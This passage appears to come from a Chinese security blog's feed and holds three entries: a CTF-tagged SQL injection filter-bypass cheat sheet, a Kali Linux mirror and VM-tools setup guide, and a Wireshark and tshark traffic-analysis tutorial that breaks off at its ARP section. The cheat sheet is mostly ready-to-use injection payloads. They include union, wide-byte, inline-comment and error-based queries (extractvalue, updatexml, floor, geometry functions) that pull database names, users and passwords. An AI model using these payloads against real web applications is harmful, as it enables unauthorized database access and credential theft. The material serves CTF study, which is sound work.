class="hljs-keyword">from</span> pass <span class="hljs-keyword">where</span> id=<span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>, <span class="hljs-built_in">substr</span>((<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> users <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span> <span class="hljs-keyword">offset</span> <span class="hljs-number">0</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><p>还可以直接用 <code>select top 1 from admin where .....代替limit 0,1 </code></p><h2 id="其他逗号绕过（使用join"><a href="#其他逗号绕过（使用join" class="headerlink" title="其他逗号绕过（使用join)"></a>其他逗号绕过（使用join)</h2><pre><code class="hljs">select * from users union select 1,2,3;select * from users union select * from (select 1)a join (select 2)b join (select 3)c;</code></pre><p>NOTE : ‘using()’ can replace ‘on’ </p><h2 id="greatest-between-绕过-等比较符号"><a href="#greatest-between-绕过-等比较符号" class="headerlink" title="greatest between 绕过&lt;,&gt; 等比较符号"></a>greatest between 绕过&lt;,&gt; 等比较符号</h2><p>当我们盲注的时候，要用到比较符号，如果过滤了可以用greatest(x,y,z,..)绕过 返回的是他们的最大值</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> ascii(substr(<span class="hljs-keyword">database</span>(),<span class="hljs-number">0</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">64</span><br></code></pre></td></tr></table></figure><p>改成</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> greatest(ascii(substr(<span class="hljs-keyword">database</span>(),<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)),<span class="hljs-number">64</span>)=<span class="hljs-number">64</span><br></code></pre></td></tr></table></figure><p>当然这里的等于号可以改成in()</p><pre><code class="hljs">SELECT * FROM `p_archives_3` WHERE `picsad` between 1113 and 1122</code></pre><p>等同于</p><pre><code class="hljs">SELECT * FROM `p_archives_3` WHERE `picsad` &gt;= 1113 and `picsad`&lt;=1122</code></pre><p>你要保证picsad是数字类型的</p><h2 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h2><p>1.()<br>括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格<br>select(user())from dual where(1&#x3D;1)and(2&#x3D;2)<br>?id&#x3D;1%27and(sleep(ascii(mid(database()from(1)for(1)))&#x3D;109))%23</p><p>2.&#x2F;**&#x2F;或者&#x2F;*1*&#x2F;</p><p>3.%0d %0a %0c %0b %a0</p><p>4.+</p><p>5.TAB</p><p>6.两个括号</p><p>7.把上面说的编一下码试试</p><p>8.select Afrom B 默认from后面必须是空格再加表名，因此为了不让你使用from可能正则表达式会检测后面的空格，我们可以用科学计数法绕过，因为1e0后面可以没有空格</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">select</span> <span class="hljs-selector-tag">A</span>,<span class="hljs-number">1</span>E0fromB  <br></code></pre></td></tr></table></figure><p>这里的逗号是两列的意思 1e0占了第二列</p><p>同样，上面的1E0可以用1.0代替</p><p>9.\N 绕过 原来一直不知道是绕过啥，后来请教了math1as师傅发现是绕过NULL,因为\N相当于NULL</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> pass <span class="hljs-keyword">where</span> id=\Nunion <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>, <span class="hljs-built_in">greatest</span>((<span class="hljs-built_in">substr</span>((<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> users <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span> <span class="hljs-keyword">offset</span> <span class="hljs-number">0</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)),<span class="hljs-string">&#x27;v&#x27;</span>)<span class="hljs-keyword">in</span>(<span class="hljs-string">&#x27;v&#x27;</span>);<br></code></pre></td></tr></table></figure><p>10.id 与from在之间的空格绕过</p><pre><code class="hljs">select+id-1+1.from users;select-id-1+3.from users;</code></pre><p>注意：第二句得到的id将会是 -id+2</p><h2 id="常见的注释"><a href="#常见的注释" class="headerlink" title="常见的注释"></a>常见的注释</h2><p>1.–+</p><p>2.#</p><p>3.%23</p><p>4.– -</p><p>5.%00</p><p>6.&#96; 单行或者多行注释（别名）</p><p>7.&#x2F;* *&#x2F; 单行或者多行注释</p><h2 id="利用过滤删除绕过"><a href="#利用过滤删除绕过" class="headerlink" title="利用过滤删除绕过"></a>利用过滤删除绕过</h2><p>比如说他过滤了&#x2F;**&#x2F;（将其删除）又过滤了select那么我们可以这么写<br>sel&#x2F;**&#x2F;ect.</p><p>意思就是被删除的可以加在另一个要删除的里面，这样不仅不会识别，删除后又还原了，实现绕过，这里面还包括双写被过滤字符的方法</p><h2 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h2><p>经常试试大小写混合比如 UnIOn sELecT….</p><h2 id="内联注释绕过"><a href="#内联注释绕过" class="headerlink" title="内联注释绕过"></a>内联注释绕过</h2><p>介绍一下什么是内联注释：&#x2F;<em>!</em>&#x2F;在其他数据库语言中是注释，但是在sql中却可以执行，为了sql提高语句的兼容性.</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">id=<span class="hljs-number">1</span><span class="hljs-comment">/*!UnIoN*/</span>+<span class="hljs-keyword">SeLeCT</span>+<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,concat(<span class="hljs-comment">/*!table_name*/</span>)+<span class="hljs-keyword">FrOM</span> <span class="hljs-comment">/*information_schema*/</span>.<span class="hljs-keyword">tables</span> <span class="hljs-comment">/*!WHERE */</span>+<span class="hljs-comment">/*!TaBlE_ScHeMa*/</span>+<span class="hljs-keyword">like</span>+<span class="hljs-keyword">database</span>()<span class="hljs-comment">-- -</span><br><br><span class="hljs-comment">/*!50001from*/</span> 表示在mysql版本高于<span class="hljs-number">50001</span>也就是mysql5中可以执行这条命令<br><br></code></pre></td></tr></table></figure><h2 id="拆分字符串绕过"><a href="#拆分字符串绕过" class="headerlink" title="+ - . 拆分字符串绕过"></a>+ - . 拆分字符串绕过</h2><p>?id&#x3D;1’ or ‘11+11’&#x3D;’11+11’<br>“-“和”.”</p><h2 id="反引号绕过"><a href="#反引号绕过" class="headerlink" title="反引号绕过"></a>反引号绕过</h2><p>可以用来过空格和正则，特殊情况下还可以将其做注释符用(单行或多行注释)实际上是mysql别名的用法，详细见雨神的博客<br><a href="http://www.yulegeyu.com/2017/04/11/%E4%B8%BA%E4%BB%80%E4%B9%88-backtick-%E8%83%BD%E5%81%9A%E6%B3%A8%E9%87%8A%E7%AC%A6/">http://www.yulegeyu.com/2017/04/11/%E4%B8%BA%E4%BB%80%E4%B9%88-backtick-%E8%83%BD%E5%81%9A%E6%B3%A8%E9%87%8A%E7%AC%A6/</a><br>select <code>version()</code></p><h2 id="符号代替文字绕过"><a href="#符号代替文字绕过" class="headerlink" title="符号代替文字绕过"></a>符号代替文字绕过</h2><p>1.&amp;&amp;代替and </p><p>2.||代替or</p><p>3.| 代替 xor</p><h2 id="宽字节绕过"><a href="#宽字节绕过" class="headerlink" title="宽字节绕过"></a>宽字节绕过</h2><p>简单的讲一下，一般当引号被过滤就会在引号前加一个\，将其转义失去作用，这样我们就不能闭合引号完成注入了。但是如果他的字符集设置为了双字节，也就是说两个字符可以代表一个中文的情况，那么我们就可以构造成一个中文字，\的url是%27我们在引号前写上%df，那么%df%27构成了中文的繁体运,引号就没有被过滤，成功绕过。当然不只是%df只要在那个字符集的范围内都可以。如%bf%27 %df%27 %aa%27</p><h2 id="等价函数变量的绕过"><a href="#等价函数变量的绕过" class="headerlink" title="等价函数变量的绕过"></a>等价函数变量的绕过</h2><p>1.hex()、bin() &#x3D;&#x3D;&gt; ascii()</p><p>2.sleep() &#x3D;&#x3D;&gt;benchmark()</p><p>这里补充一下:</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">在sqlsever 中用 <span class="hljs-keyword">waitfor </span>delay<br>在<span class="hljs-keyword">Oracle </span>中用 DBMS_PIPE.RECEIVE_MESSAGE()函数和CASEWHEN„THEN„语句<br></code></pre></td></tr></table></figure><p>3.concat_ws()&#x3D;&#x3D;&gt;group_concat()</p><p>4.mid()、substr() &#x3D;&#x3D;&gt; substring()</p><p>5.@@user &#x3D;&#x3D;&gt; user()</p><p>6.@@datadir &#x3D;&#x3D;&gt; datadir()</p><p>7.@@version &#x3D;&#x3D;&gt; version()</p><h2 id="数字的其他写法绕过空格"><a href="#数字的其他写法绕过空格" class="headerlink" title="数字的其他写法绕过空格"></a>数字的其他写法绕过空格</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">select</span> * from users where id=<span class="hljs-number">8</span>E0union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0</span><br><span class="hljs-attribute">select</span> * from users where id=<span class="hljs-number">8</span>.<span class="hljs-number">0</span>union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>注：E0是科学计数法</p><h2 id="conv-10-36-代替字母"><a href="#conv-10-36-代替字母" class="headerlink" title="conv(,10,36)代替字母"></a>conv(,10,36)代替字母</h2><p>conv(10,10,36)是大写的A<br>lower(conv(10,10,36&#x2F;16s))小写的a</p><h2 id="常见的bypass"><a href="#常见的bypass" class="headerlink" title="常见的bypass"></a>常见的bypass</h2><p>1.id&#x3D;1+(UnIoN)+(SelECT)+</p><p>2.id&#x3D;1+(UnIoN+SeLeCT)+</p><p>3.id&#x3D;1+(UnI)(oN)+(SeL)(EcT)</p><p>4.id&#x3D;1+’UnI’’On’+’SeL’’ECT’ &lt;-MySQL only</p><p>5.id&#x3D;1+’UnI’||’on’+SeLeCT’ &lt;-MSSQL only</p><h2 id="使用count-返回数据行数"><a href="#使用count-返回数据行数" class="headerlink" title="使用count(*) 返回数据行数"></a>使用count(*) 返回数据行数</h2><pre><code class="hljs">select count(*) from users;+----------+| count(*) |+----------+|       13 |+----------+</code></pre><p>注意： 这里的行数只是真正的行数，不是最终的id 编号</p><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>1.extractvalue 报错</p><pre><code class="hljs">and extractvalue(1, concat(1, (select database() limit 0,1)))--+;</code></pre><p>查表<br>and extractvalue(1, concat(1,(select table_name from information_schema.tables limit 0,1)))–+;<br>查列<br>and extractvalue(1, concat(1,(select column_name from information_schema.columns limit 0,1)))–+;<br>查数据<br>and extractvalue(1, concat(1,(select password from users  limit 0,1)))–+;</p><p>2.UpdateXml报错</p><p>测试语句</p><pre><code class="hljs">and 1=(updatexml(1,concat(0x3a,(select user())),1))</code></pre><p>实际测试过程</p><pre><code class="hljs">mysql&gt; select * from article where id = 1 and 1=(updatexml(0x3a,concat(1,(select user())),1))ERROR 1105 (HY000): XPATH syntax error: ’:root@localhost’ </code></pre><p>3.运算数值的大小限制报错</p><pre><code class="hljs">select exp(~(select*from(select user())a))；ERROR 1690 (22003): DOUBLE value is out of range in &#39;exp(~((select &#39;root@localhost&#39; from dual)))&#39;</code></pre><p>这个函数是计算e的n次方，~是按位取补，exp计算的次方数是有限制的，我们如果给他传一个字符串，php 的弱类型就会当成是0这样取反之后就超了，报错</p><p>类似的还有：<br><br>select !(select*from(select user())x)-~0;</p><p>这里注意一下：</p><p>进行嵌套查询的时候子查询出来的的结果是作为一个派生表来进行上一级的查询的，所以子查询的结果必须要有一个别名，一般是as+别名 但是as 可以省略。</p><p>4.floor()</p><pre><code class="hljs">select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</code></pre><p>5.geometrycollection()</p><pre><code class="hljs">select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));</code></pre><p>6.multipoint()</p><pre><code class="hljs">select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));</code></pre><p>7.polygon()</p><pre><code class="hljs">select * from test where id=1 and polygon((select * from(select * from(select user())a)b));</code></pre><p>8.linestring()</p><pre><code class="hljs">select * from test where id=1 and linestring((select * from(select * from(select user())a)b));</code></pre><p>9.multilinestring()</p><pre><code class="hljs">select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));</code></pre><p>10.multipolygon()</p><pre><code class="hljs">select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));</code></pre><h2 id="限制与from的组合"><a href="#限制与from的组合" class="headerlink" title="限制与from的组合"></a>限制与from的组合</h2><p>用 from. 代替 from </p><h2 id="如果遇到表名或者字段名是保留字"><a href="#如果遇到表名或者字段名是保留字" class="headerlink" title="如果遇到表名或者字段名是保留字"></a>如果遇到表名或者字段名是保留字</h2><p>这个时候最好使用点号连接表名和字段名，或者直接使用反引号包起来</p><p>##利用mysql 的特性<br>1.当使用自定义的不存在函数的时候就会报错显示出库的名字</p><pre><code class="hljs">mysql&gt; select * from users where id =a()；ERROR 1305 (42000): FUNCTION security.a does not exist</code></pre><p>2.当查找重复的列的是时候就会报错<br><br>pro_id&#x3D;2 union select * from (select * from product_2017ctf as A join product_2017ctf as B using(pro_id)) as C<br>Duplicate column name ‘pro_name’ </p><p>注意： MySQL是兼容两个列相同的但是却不兼容在这个基础上再select * from </p><h2 id="在列名被过滤的情况下得到结果"><a href="#在列名被过滤的情况下得到结果" class="headerlink" title="在列名被过滤的情况下得到结果"></a>在列名被过滤的情况下得到结果</h2><p>要在不出现字段名的情况下查出内容，将一个虚拟表和当前表联合起来即可</p><pre><code class="hljs">pro_id=-1 union select 1,a.4,3,4 from (select 1,2,3,4 from dual union select * from product_2017ctf)a limit 3,1; </code></pre><p>##在函数名与括号间添加空格或者注释绕过函数过滤</p><p>例如：</p><p>concat&#x2F;**&#x2F;()</p><h2 id="在查询时使用一个不存在的函数就能报错出数据库的名字"><a href="#在查询时使用一个不存在的函数就能报错出数据库的名字" class="headerlink" title="在查询时使用一个不存在的函数就能报错出数据库的名字"></a>在查询时使用一个不存在的函数就能报错出数据库的名字</h2><p>select password from contents where id&#x3D;a()<br>这个a()是不存在的函数，结果如下</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/mysql_trick.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>kali源以及虚拟机工具安装</title>
    <link href="/2017/11/04/kali/"/>
    <url>/2017/11/04/kali/</url>
    
    <content type="html"><![CDATA[<p>kali Linux源的安装</p><p>重新启动Kali Linux后，第一步就是在桌面上打开Terminal，键入：<br>leafpad &#x2F;etc&#x2F;apt&#x2F;sources.list<br>用“#”注释掉其它语句，然后输入：</p><span id="more"></span><p>deb <a href="http://mirrors.tuna.tsinghua.edu.cn/kali">http://mirrors.tuna.tsinghua.edu.cn/kali</a> kali-rolling main non-free contrib<br>&#x2F;&#x2F;<em>现在Kali的官方源慢的很，改为清华的源</em>&#x2F;&#x2F;<br>保存后退出。</p><p>在Terminal中键入：<br>apt-get update &amp;&amp; apt-get upgrade<br>中间会有交互，根据需要选择即可。再升级一下系统，输入：<br>apt-get dist-upgrade<br>apt-get clean<br>完成后重新启动系统。</p><p>因为是虚拟机安装，需要安装VM-Tools，如果安装Vmware的VM-Tools，麻烦且还要关注升级，所以选择安装Kali Linux自己的VM-Tools，Terminal中输入：<br>apt-get install open-vm-tools-desktop fuse<br>&#x2F;&#x2F;<em>安装Open-VM-Tools后，图形化的用户管理不能用了</em>&#x2F;&#x2F;</p>]]></content>
    
    
    
    <tags>
      
      <tag>kali</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>网络数据包分析漫谈</title>
    <link href="/2017/10/30/%E7%BD%91%E7%BB%9C%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90%E6%BC%AB%E8%B0%88/"/>
    <url>/2017/10/30/%E7%BD%91%E7%BB%9C%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90%E6%BC%AB%E8%B0%88/</url>
    
    <content type="html"><![CDATA[<h2 id="一、wireshark基础篇"><a href="#一、wireshark基础篇" class="headerlink" title="一、wireshark基础篇"></a><strong>一、wireshark基础篇</strong></h2><h3 id="1-wireshark-主窗口的界面"><a href="#1-wireshark-主窗口的界面" class="headerlink" title="1.wireshark  主窗口的界面"></a><strong>1.wireshark  主窗口的界面</strong></h3><p>1.最上面是标题栏，显示分析的抓包文件的名称，捕获的设备名称以及wireshark 的版本号等等</p><p>2.菜单栏</p><p>3.工具栏</p><span id="more"></span><p>4.筛选器</p><p>5.packet list 显示捕获的每个数据帧的摘要（注意是数据帧不是数据包，但我们习惯上称为数据包）</p><p>6.packet details  分层显示数据包中的全部内容</p><p>7.packet bites 以十六进制和ascii的格式显示数据包的内容，这个是未经处理的在链路上传播时候的样子</p><p>8.状态栏，包括专家信息，注释，包的数量等</p><h3 id="2-数据包的叫法的区别"><a href="#2-数据包的叫法的区别" class="headerlink" title="2.数据包的叫法的区别"></a><strong>2.数据包的叫法的区别</strong></h3><p>帧，包，段</p><p>数据帧的起始点和目的点都是数据的链路层</p><p>数据包的起始点和目的点是网络层</p><p>段的起始点和目的地都是传输层</p><h3 id="3-packet-details-分析"><a href="#3-packet-details-分析" class="headerlink" title="3.packet details 分析"></a><strong>3.packet details 分析</strong></h3><p>Frame 是物理层信息</p><p>Ethernet  是数据链路层头部信息</p><p>Internet protocol 是网络层头部信息</p><p>Transmission control proticol 是传输层头部信息</p><p>Hypertext Transfer protocol是应用层的信息</p><h3 id="①frame"><a href="#①frame" class="headerlink" title="①frame"></a><strong>①frame</strong></h3><p>第一行：数据帧的序号，在这个线路中一共有的字节数，实际捕获的字节数</p><p>第二行： 接口id </p><p>第三行： 封装的类型</p><p>第四、五、六行：捕获的日期和时间</p><p>第七行：当前数据帧和前一个数据帧的时间间隔</p><p>第八行：当前数据帧和前一个显示的数据帧的时间间隔</p><p>第九行：当前数据帧与参考数据帧或者第一个数据帧的时间间隔</p><p>第十行：数据帧的序号</p><p>第十一行：数据帧的长度</p><p>第十二行：捕获的数据帧的长度</p><p>第十三行： 帧是否做了标记</p><p>第十四行： 帧是否被忽略</p><p>第十五行：帧内封装的协议的层次结构</p><p>第十八行：着色标记的协议名称</p><p>第十九行：着色规则显示的字符串</p><h3 id="②Ethernet"><a href="#②Ethernet" class="headerlink" title="②Ethernet"></a><strong>②Ethernet</strong></h3><p>1.目标的mac地址</p><p>2.源mac地址</p><blockquote><p><strong>注意：</strong> </p><p>wireshark 会自动分析mac地址的厂商并显示，因为mac地址的前三个字节表示的就是厂商</p></blockquote><h3 id="③internet"><a href="#③internet" class="headerlink" title="③internet"></a><strong>③internet</strong></h3><p>1.协议的版本 4&#x2F;6</p><p>2.协议头部的长度</p><p>3.差分服务字段</p><p>4.IP包总的长度</p><p>5.标志字段</p><p>6.标志字段</p><p>7.分片的偏移</p><p>8.生存期</p><p>9.当前数据包封装的上层协议</p><p>10.头部数据的校验和</p><p>11.源ip地址</p><p>12.目标ip地址</p><h3 id="④transmossion"><a href="#④transmossion" class="headerlink" title="④transmossion"></a><strong>④transmossion</strong></h3><p>1.源端口号</p><p>2.目的端口号</p><p>3.相对序列号</p><p>4.下一个序列号</p><p>5.确认序列号</p><p>6.头部长度</p><p>7.tcp标记字段</p><p>8.流量控制的窗口大小</p><p>9.tcp数据段的校验和</p><h3 id="⑤筛选器"><a href="#⑤筛选器" class="headerlink" title="⑤筛选器"></a><strong>⑤筛选器</strong></h3><p><strong>常见属性：</strong></p><p>1.clear 能清空</p><p>2.支持 and or not 等逻辑运算符</p><p>3.支持比较运算符</p><p><strong>常见的用法：</strong></p><p>1.查找确定的ip和端口号的数据帧</p><pre><code class="hljs">ip.addr== xxx.xxx.xxx.xxx and tcp.port==80</code></pre><p>2.查找非tcp的数据帧</p><pre><code class="hljs">!tcp</code></pre><p>3.查找大小小于150的数据帧</p><pre><code class="hljs">frame.len&lt;=150</code></pre><p>4.协议域筛选器：通过检查协议头里面的某个字节创建筛选条件，或者匹配从数据帧里面从某一个特定位置开始的一定数量的字节</p><p>如：捕获含有psh 和ack标记的数据包</p><pre><code class="hljs">tcp[13]==0x18注： 13是偏移量</code></pre><p>5.我们为了避免重复地输入筛选条件可以对我们的筛选条件进行保存</p><p>在analyze 中选择 display filter 给我们当前的筛选条件起一个名字，然后保存</p><h3 id="4-wireshark-的实用表格"><a href="#4-wireshark-的实用表格" class="headerlink" title="4.wireshark 的实用表格"></a><strong>4.wireshark 的实用表格</strong></h3><h3 id="①端点："><a href="#①端点：" class="headerlink" title="①端点："></a><strong>①端点：</strong></h3><p>网络中要想正常通信就必须拥有至少两台设备或者说端点进行数据的交互操作，所谓端点就是网络上用于发送或者接受数据的设备</p><p>我们在packet list中看到的源和目的ip其实就是端点，但是我们数据的传输在链路层实际上是通过mac地址和网卡的 </p><p>我们可以在菜单栏中选择statistics endpoints </p><p>以ethernet 为例</p><p>Tx packets 是发送的数据包的数量</p><p>Rx packets 是接收的数据包的数量</p><p>左下角有一个名称解析功能，用于mac地址的厂商识别</p><p>我们可以在编辑的首选项中选择name resolution 中的Geoip … 自己下载对应的dat文件，重启之后就能在端点中看到更多的信息，如经纬度等</p><h3 id="②会话："><a href="#②会话：" class="headerlink" title="②会话："></a><strong>②会话：</strong></h3><p>两个端点之间的通信的活动，最常见的会话就是连接建立的时候的三次握手<br>我们进入 ststistics 中的 conversstion 如果我们点击右键，选择apply as a filter –&gt;seletced 我们就可以很方便地选择筛选器，无需手工输入</p><p>端点和会话在网络分析中扮演着重要的角色，当我们想分析网络中大规模流量的源头以及，哪台主机较为活跃的时候</p><blockquote><p><strong>注意：</strong></p><p>最活跃的通信端点不一定有流量最大的会话</p></blockquote><h3 id="③协议的分层统计"><a href="#③协议的分层统计" class="headerlink" title="③协议的分层统计"></a><strong>③协议的分层统计</strong></h3><p>我们在获得大量的数据包的时候需要根据协议来进行分层，这样就能很直观地看出每个协议的占比，发现异常的情况</p><p>打开统计的， protocol herachy协议分层 统计窗口是我们进行网络流量检查时最先打开的的窗口之一，提供给我们网络中活跃类型的直观的快照，根据网络中协议的分布情况获取网络中用户和设备的情况，甚至只用查看网络中分布的流量就能分辨这个网段属于哪个部门,比如： it部门的网段流量中经常有管理协议，控制报文协议icmp ，简单网络管理协议snmp,订单管理部门常有大量的简单邮件传输协议smtp 。</p><h3 id="5-wireshark-的图形显示"><a href="#5-wireshark-的图形显示" class="headerlink" title="5.wireshark 的图形显示"></a><strong>5.wireshark 的图形显示</strong></h3><p><strong>位置:</strong></p><pre><code class="hljs">statistics  --&gt;IO Graph</code></pre><p><strong>图像的横轴表示的是时间，纵轴表示数据包的数量</strong></p><p>Graph 1-5 表示开启1-5的图表，</p><p>color代表图表的颜色，</p><p>filter 是筛选器，</p><p>style是图表的样式（默认是折线）</p><p>tick interval 是每格占用的时间单位是秒</p><p>pixels per tick是每格占用的像素</p><p>unit 表示y轴的单位</p><p>scale 表示y轴单位的刻度</p><p>smooth  表示的是图表的平滑度</p><p>其中过滤器的过滤方式和显示过滤器一样</p><p>tcp.analysis.flags &amp;&amp; tcp.analysis.window_update</p><p>tcp.analysis.duplicate_ack 重发的确认包</p><p>tcp.analysis.lost_segment</p><p>tcp.analysis.retransmission</p><p><strong>对捕获的文件进行往返时间的绘图</strong></p><p><strong>往返时间：</strong> 数据包到达目的地的时间和收到确认信息的时间之和</p><p><strong>目的：</strong> 找出通信中的瓶颈，确定是否存在着延迟</p><p>（选择tcp stream graph 大部分比较小，说明整体是可以被接受的）</p><p>数据流图</p><pre><code class="hljs">flowgraph</code></pre><p>可以将连接可视化，并且将一段时间中的数据流显示出来（以列的方式）</p><h3 id="6-wireshark-的高级特性"><a href="#6-wireshark-的高级特性" class="headerlink" title="6.wireshark 的高级特性"></a><strong>6.wireshark 的高级特性</strong></h3><p><strong>(1)协议解析器：</strong></p><p>是原始二进制数据和wireshark数据之间的翻译器，协议解析器的选择不一定总是对的特别是网络中的协议使用了不同于标准的配置的时候，那么我们就需要更改wireshark 的协议解析的方式</p><p>比如，wireshark 显示ssl协议，但是我们却能看到明文传输的用户名密码，说明wireshark判断失误，实际上这个协议是tp,很可能是因为ftp使用了443端口（原本是分配个ssl的）<br>可以直接选中数据包右击，选择</p><pre><code class="hljs">decode as </code></pre><p>选中ftp修改为ftp解析(这个修改是临时的，我们下次打开还要重新修改)我们还可以选择</p><pre><code class="hljs">show current </code></pre><p>查看修改记录</p><p><strong>(2)TCP stream:</strong></p><p>选中数据包，右键 follow  tcpstream 就能查看重组的tcp流，而不是分散的数据帧 </p><p>我们还能在一组或者一个数据包的大小中获得很多的信息,y以太网上帧的大小是1518个字节，除去各种的头部信息外还能剩余1460个字节，这些字节供应用层协议使用，这样我们就能通过捕获的数据包长度的分布情况来对流量进行分析</p><pre><code class="hljs">statistics---&gt; packetslength---&gt;create stat </code></pre><p>我们重点 关注<br>1280-2559这个字段的数据包，一般这种较大的数据包都是用于数据的传输（http的下载 ftp的上传），较小的数据包是用于保存协议的控制序列。<br>40-79 这个区段保存的是tcp控制的数据包<br>在深入分析之前对捕获的文件进行概览是很有必要的</p><p><strong>(3)专家信息</strong></p><p>整个网络中的tcp信息都会被wireshark的专家信息所记录，比如丢包 和网络阻塞等，针对每个协议的解析器都会有一些专家信息，我们可以通过专家信息查看使用该协议的数据包中的 特定状态的错误，警告，提示等信息</p><p>analyze –&gt; expert info </p><p>errors 数据包里面或者解析器解析时的错误</p><p>warnings 是不正常通信中的异常数据包</p><p>notes 是正常通信中的异常数据包</p><p>chats 是网络通信的基本信息</p><p>details 显示数据包的详细信息</p><p>packet comments 是数据包的描述信息</p><p>(选项卡括号中的是消息出现的次数，括号外面的是不同的消息的数量)</p><h3 id="7-wireshark-命令行模式"><a href="#7-wireshark-命令行模式" class="headerlink" title="7.wireshark 命令行模式"></a><strong>7.wireshark 命令行模式</strong></h3><p>在实际的分析过程中为了得到精确的分析结果往往需要通过编写脚本来达到我们的目的，所以我们不能只依赖图形化界面还要会用命令行模式 tshark.exe ,一般是在kali下使用的，windows不支持grep awk 等命令</p><p><strong>查看get请求相关数据</strong></p><pre><code class="hljs">tshark -r /root/桌面/1.pcapng |grep -e &#39;GET&#39;</code></pre><p><strong>分析nfs协议</strong></p><pre><code class="hljs">tshark -n -q -r  /root/桌面/1.pcapng -z &quot;rpc,programs&quot;-n 禁止所有地址名字解析-q  设置为标准的输出</code></pre><p><strong>分析  cifs</strong> </p><pre><code class="hljs">tshark -n -q -r  /root/桌面/1.pcapng -z &quot;smb,srt&quot;</code></pre><p><strong>分析每一秒里面的cifs操作的服务响应时间</strong></p><pre><code class="hljs">tshark -n -q -r  /root/桌面/1.pcapng -z &quot;io,stat,1.00,AVG&lt;smb.time&gt;smb.time&quot;</code></pre><p><strong>分析特定ip的数据包</strong></p><pre><code class="hljs">tshark -r 1.pcapng  -Y ip.addr==xxx.xxx.xxx.xxx -w  new.pcapng</code></pre><p><strong>如果我们想要获取文件的概述信息我们可以使用capinfos这个命令行工具</strong></p><pre><code class="hljs">capinfos /root/桌面/1.pcapng</code></pre><p><strong>统计重传的情况</strong></p><pre><code class="hljs">tshark -n -q -r  /root/桌面/1.pcapng -z &quot;io,stat,0,tcp.analysis.retransmission&quot;</code></pre><p><strong>统计乱序的情况</strong></p><pre><code class="hljs">tshark -n -q -r  /root/桌面/1.pcapng -z &quot;io,stat,0,tcp.analysis.outoforder&quot;</code></pre><p><strong>查看会话信息</strong></p><pre><code class="hljs">tshark -n -q -r  /root/桌面/1.pcapng -z &quot;conv,tcp&quot;</code></pre><p><strong>数据包分割：</strong></p><p>注意对于特别大的捕获文件，连tshark都无法打开我们就需要对其进行分割使用editcap</p><p>把1.pcapng 文件以4秒为分界进行拆分</p><pre><code class="hljs">editcap  1.pcapng  output.pcapng -i 4 </code></pre><h2 id="二、wireshark协议篇"><a href="#二、wireshark协议篇" class="headerlink" title="二、wireshark协议篇"></a><strong>二、wireshark协议篇</strong></h2><h3 id="1-分析ARP数据包"><a href="#1-分析ARP数据包" class="headerlink" title="1.分析ARP数据包"></a><strong>1.分析ARP数据包</strong></h3><p>ARP 